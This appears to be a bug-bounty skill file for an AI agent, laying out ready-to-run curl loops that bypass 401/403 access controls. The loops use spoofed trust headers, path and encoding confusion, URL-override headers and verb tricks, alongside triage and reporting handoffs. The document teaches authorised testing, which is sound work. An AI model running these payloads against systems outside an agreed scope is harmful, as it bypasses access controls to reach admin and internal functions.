---
name: 403-401
description: "Use when a gated path returns 401/403 and you want to flip it to 200 without credentials: identity/trust headers (X-Forwarded-For:127.0.0.1, True-Client-IP, X-Original-URL), path & encoding confusion (%2e, ..;/, case, trailing ?), URL-override headers, method/case tricks. Baseline-first, WAF-vs-ACL triage. Confirms the flip and stops — cross-user impact → /rbac or /idor."
---

# /403-401 — 401/403 Access-Control Bypass

Turn a `401`/`403` into a `200` **without credentials**. The block is rarely one wall — it's a **gap between
two layers** (a front layer: WAF / reverse proxy / load balancer; and a backend: the app). The bypass lives
where those two layers **disagree**: about *who you are* (does the front trust a header the backend honors?)
or *what you asked for* (do they normalize the path/verb the same way?). Every technique below is just a way
to make the front layer and the backend read the same request differently.

This is **discovery-level**: it confirms the block flips open and **stops**. Proving you reached *another
user's* data or function is a separate, cross-account step → `/rbac` (vertical/role) or `/idor` (object).

**Baseline before you test — status-code change alone is not a bypass.** A `403 → 200` that returns the same
login/block page is noise. The win is a new status **and** new content or functionality.

---

## Core Philosophy

* **Baseline first.** Capture the blocked response (status + size + body) before you touch anything. Every
  candidate is judged against that baseline, in isolation — you print only responses that *move off* it.
* **New status + new content = bypass; new status + same page = nothing.** The most common false positive is a
  `200` that is literally the login page or the WAF block page with a different status. Compare body length and
  content, not just the code.
* **Two failure modes, one gap.** *Identity* bypasses make the front layer believe you're internal/authorized
  (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`). *Resource* bypasses make the front layer fail to recognize
  the protected path at all (path/encoding/verb confusion), so it never blocks, while the backend serves it.
* **Rule out the WAF first.** A WAF `403` and an app-ACL `403` are byte-identical. A block born from noisy
  brute-force or a known WAF product is a `/waf-bypass` problem, not an access-control one (see *WAF vs ACL*).
* **Headless, low-rate, in-scope.** `curl` only, against in-scope hosts, sequential, under ~10 req/s. These
  are *targeted* checks on paths you already found — not brute force (that's `/ffuf-skill`).

---

## Baseline — capture before any bypass

Every loop below compares against `$bl` (the blocked baseline) and prints only flips. Set once:

```bash
BASE="https://app.target.tld"; G="/admin"                       # the gated path
# baseline: status + size (size lets you spot a 200 that's the same block page)
read -r bl sz < <(curl -sk -o /dev/null -w '%{http_code} %{size_download}' "$BASE$G")
echo "baseline: $bl  size=$sz  $G"
```

`$bl` is almost always `403` or `401`. Anything that leaves `$bl` toward `200`/`302` is a candidate to triage
below — **not** a confirmed win yet.

---

## The bypass set (cheap → expensive)

Run in order. Each block prints `FLIP <code>  (<mutation>)` only when the response differs from baseline.

### 1. Identity / trust headers — play with who you "are"

Reverse proxies often trust a header to decide internal-vs-external. If a rule says "allow `127.0.0.1`" but
trusts the header blindly, you become internal. One layer reads the header and thinks you're local; the next
layer just sees a normal request.

```bash
for h in \
  "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Client-IP: 127.0.0.1" \
  "X-Cluster-Client-IP: 127.0.0.1" "True-Client-IP: 127.0.0.1" "X-ProxyUser-Ip: 127.0.0.1" \
  "X-Remote-IP: 127.0.0.1" "X-Remote-Addr: 127.0.0.1" "X-Forwarded: 127.0.0.1" \
  "Forwarded-For: 127.0.0.1" "X-Original-Forwarded-For: 127.0.0.1" \
  "X-Forwarded-Host: localhost" "Host: localhost" \
  "X-Custom-IP-Authorization: 127.0.0.1" "X-Forwarded-Server: 127.0.0.1"; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "$BASE$G" -H "$h")
  [[ "$code" != "$bl" ]] && printf 'FLIP %s  (%s)\n' "$code" "$h"
done
# parser quirk: some stacks split on _ not - , so X_Forwarded_For reads differently than X-Forwarded-For
curl -sk -o /dev/null -w '%{http_code}\n' "$BASE$G" -H 'X_Forwarded_For: 127.0.0.1'
# not just 127.0.0.1 — try a comma chain / private ranges; ACLs that "allow internal" sometimes match on prefix
for ip in "127.0.0.1, 127.0.0.1" "127.0.0.1, $BASE" "10.0.0.1" "172.16.0.1" "192.168.1.1" "0.0.0.0" "localhost"; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "$BASE$G" -H "X-Forwarded-For: $ip")
  [[ "$code" != "$bl" ]] && printf 'FLIP %s  (XFF=%s)\n' "$code" "$ip"
done
```

### 2. Path & encoding tricks — confuse the parser

Most `403` rules are dumb string checks ("block `/admin`"). If the front layer and the backend normalize the
path **differently**, you slide around the check: the front sees a "weird" path, fails to match the block, and
lets it through; the backend normalizes it back to `/admin` and serves it.

```bash
for v in \
  "$G/" "/$G/" "$G/." "/./$G/" "/$G/." "$G;" "$G;/" "$G/..;/" "/..;/$G" \
  "/%2e$G" "/%2e%2e/$G" "/%2f$G" "$G%2f" "$G%09" "$G%20" "$G%23" \
  "$G?" "$G#" "$G//" "$G/ " "$G." "$G.json" "$G.php" "$G.html" \
  "$G..%ff" "$G%00" "/%2f%2f$G" "$G/." "/$G/..;/" \
  "${G^^}" "${G,,}"; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "$BASE$v")
  [[ "$code" != "$bl" ]] && printf 'FLIP %s  %s\n' "$code" "$v"
done
# double-encoding & overlong UTF-8: parsers that decode twice collapse %252f → %2f → /
for v in "$G%252f" "/%252e$G" "$G%c0%af" "$G%c0%2f" "$G/../$G"; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "$BASE$v")
  [[ "$code" != "$bl" ]] && printf 'FLIP %s  %s\n' "$code" "$v"
done
```

> **Real example — Apache Tomcat `401 → 200` via trailing slash** (Liodeus, field finding). A
> Tomcat instance gated `/debug` with Basic Auth: `GET /debug` → `401`, but `GET /debug/` →
> `200`. The Servlet `<security-constraint>` is keyed on the exact `<url-pattern>` and doesn't
> match the trailing-slash variant, so the auth gate never fires while Tomcat still resolves and
> serves the resource. This is the bare `$G/` mutation above — any Servlet/Tomcat `401`/`403` on
> a bare path is worth the trailing-slash retest (also try `$G;.`, `$G%2f`, case). *Side lead from
> the same host:* the root redirected to `admin.<host>`, which was NXDOMAIN — worth a DNS check
> for a dangling CNAME (a subdomain-takeover prerequisite); NXDOMAIN alone, with no CNAME, is not
> a takeover by itself.

### 3. URL-override headers — change the route internally

Some proxies support headers that rewrite the URL **after** the front layer's allow/deny decision. You request
a harmless path (`/`), the front layer checks `/` (looks fine, passes), then a header tells the backend
"actually serve `/admin`". The rule on `/admin` never fires because the front never saw `/admin`.

```bash
for h in "X-Original-URL: $G" "X-Rewrite-URL: $G" "X-Override-URL: $G" \
         "X-URL: $G" "X-HTTP-Method-Override: GET" "Referer: $BASE$G"; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "$BASE/" -H "$h")   # <-- note: GET /, header rewrites
  [[ "$code" != "$bl" ]] && printf 'FLIP %s  (%s)\n' "$code" "$h"
done
```

### 4. Method & case tricks — how strict is the front layer?

Filters often only watch "normal" traffic — uppercase `GET`/`POST`. If the WAF inspects only `GET`/`POST` but
the backend maps *any* method to the same handler, a weird verb sails past the check and still hits the code.

```bash
# direct verb matrix — this is also recon's "HTTP methods on key endpoints" checklist item
for m in GET HEAD POST PUT PATCH DELETE PROPFIND OPTIONS CONNECT TRACE; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "$BASE$G" -X "$m")
  [[ "$code" != "$bl" ]] && printf 'FLIP %s  -X %s\n' "$code" "$m"
done
# case + nonsense verbs (backend often treats unknown verbs as GET)
for m in get GeT gEt PoSt ANYTHING; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "$BASE$G" -X "$m")
  [[ "$code" != "$bl" ]] && printf 'FLIP %s  -X %s\n' "$code" "$m"
done
# override header on a plain POST (proxy normalizes the verb, backend honors the override)
curl -sk -o /dev/null -w '%{http_code}\n' "$BASE$G" -X POST -H 'X-HTTP-Method-Override: GET'
curl -sk -o /dev/null -w '%{http_code}\n' "$BASE$G" -X POST -H 'X-Method-Override: GET'
# which verbs are actually wired? an unexpected Allow: is itself signal
curl -sk -D - -o /dev/null "$BASE$G" -X OPTIONS | ugrep -i '^allow:'
```

---

## Triage — real bypass vs noise

A printed `FLIP` is a lead, not a finding. Re-fetch it capturing full body + headers and judge:

| Signal | Verdict |
|---|---|
| `403→200`/`302`, **new** body (real data / panel / clearly different length) | candidate — confirm below |
| `403→200`, **same** login/block page (≈ same `$sz`) | **not** a bypass — drop |
| `403→302` that redirects to auth then back to `403` | **not** a bypass |
| `401→200` **without** any credentials | strong — auth bypass |
| Only `HEAD`/`OPTIONS` differs from `GET` | usually false positive (`HEAD` returns `200`, `GET` still blocks) — **re-verify with `GET`** |

**Confirm:** re-run the flipping mutation with `-D -` and save the response; confirm the new content/function
actually renders (real admin UI, real user record, real export) — not a generic landing page. A `200` that
shows no new data is nothing.

---

## WAF vs ACL — classify the 403 first

A WAF `403` and an app access-control `403` look identical. Before you chase ACL bypasses, decide which it is:

* **Noisy origin** — did the block appear after brute-force/fuzzing, a known-bad payload, or repeated probes?
  → likely WAF/rate-limit → `/waf-bypass`.
* **Known WAF product** (Cloudflare/Akamai/AWS WAF/etc. from recon B.1) → its `403` is signature-based →
  `/waf-bypass`.
* **Clean, single, low-noise** request `403`s on a sensitive gated path (`/admin`, `/internal`, `/export`,
  `/config`, `/actuator/*`)? → **app ACL** → use this skill.

**WAF 403 → `/waf-bypass`; app-ACL 403 → `/403-401`.** Chasing ACL bypasses against a WAF block wastes the
engagement and trips IP bans.

---

## Impact & handoff

This skill turns a block into access and **stops** — it does not, on its own, prove cross-user impact.

* A `403→200` flip that reveals **another user's** data or an **admin** function → **`/rbac`** (vertical/role)
  or **`/idor`** (object) to confirm with a second account (CLAUDE.md Phase 4.5). Replay the flipping request
  with the second identity's session to prove the access is real and cross-user.
* A `401→200` with **zero credentials** (no session, no token) → standalone **auth bypass** →
  `/report-yeswehack` directly (CLAUDE.md priority #2).
* A flip that only changes the code but shows no new data → not reportable; log and move on.

**Never report a bare status-code flip.** The bounty is in the access it grants.

---

## Completion checklist

- [ ] **Blocked baseline captured** (status `$bl` + size `$sz` + body).
- [ ] **Identity/trust headers** tried (§1) incl. underscore variant + internal-IP chain.
- [ ] **Path & encoding** set tried (§2) incl. double-encoding.
- [ ] **URL-override headers** tried on `GET /` (§3).
- [ ] **Method/case** set tried (§4); `Allow:` header inspected.
- [ ] Every `FLIP` **re-verified for real new content** (not the same block page).
- [ ] **WAF ruled out** before calling it an ACL win (WAF vs ACL).
- [ ] Real access win **handed to `/rbac` / `/idor`** (or `/report-yeswehack` if a zero-cred auth bypass).

---

## Quick reference

```bash
BASE="https://app.target.tld"; G="/admin"
read -r bl sz < <(curl -sk -o /dev/null -w '%{http_code} %{size_download}' "$BASE$G")   # baseline
# 1 identity: X-Forwarded-For/X-Real-IP/True-Client-IP/X-Original-Forwarded-For:127.0.0.1, X-Forwarded-Host:localhost
# 2 path:     /admin/  /admin/.  /./admin/  /admin/..;/  /%2e/admin  /admin%2f  /admin?  /admin//  /admin..%ff  /admin%252f  /ADMIN
# 3 override: GET / + X-Original-URL:/admin (also X-Rewrite-URL, X-Override-URL, X-URL)
# 4 method:   -X HEAD/POST/PUT/PATCH/DELETE/PROPFIND/OPTIONS/get/ANYTHING; X-HTTP-Method-Override:GET; OPTIONS→Allow:
# triage: 403→200 NEW body = candidate; 403→200 same page = drop; 401→200 no creds = auth bypass
# WAF 403 → /waf-bypass | app-ACL 403 → here | confirmed flip → /rbac or /idor (cross-account)
```
